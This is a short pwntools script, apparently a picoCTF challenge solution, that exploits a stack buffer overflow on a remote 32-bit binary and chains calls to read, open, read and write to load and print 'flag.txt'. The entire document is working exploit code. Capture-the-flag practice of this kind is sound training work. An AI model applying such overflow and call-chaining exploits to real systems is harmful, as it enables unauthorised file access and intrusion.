from pwn import *
context(os='linux',arch='i386',log_level='debug')
open=0x806EC20
read=0x806ECE0
write=0x806ED80
vuln=0x8049D85
file_addr=0x80E5B00
p=remote("saturn.picoctf.net",55722)

payload1=b'a'*28+p32(read)+p32(vuln)+p32(0)+p32(file_addr)+p32(100)
p.sendlineafter("grasshopper!\n",payload1)
p.sendline(b"flag.txt\x00")

payload2=b'a'*28+p32(open)+p32(vuln)+p32(file_addr)+p32(0)
p.sendlineafter("grasshopper!\n",payload2)

payload3=b'a'*28+p32(read)+p32(vuln)+p32(5)+p32(file_addr)+p32(100)
p.sendlineafter("grasshopper!\n",payload3)

payload4=b'a'*28+p32(write)+p32(vuln)+p32(1)+p32(file_addr)+p32(100)
p.sendlineafter("grasshopper!\n",payload4)
print(p.recvline())

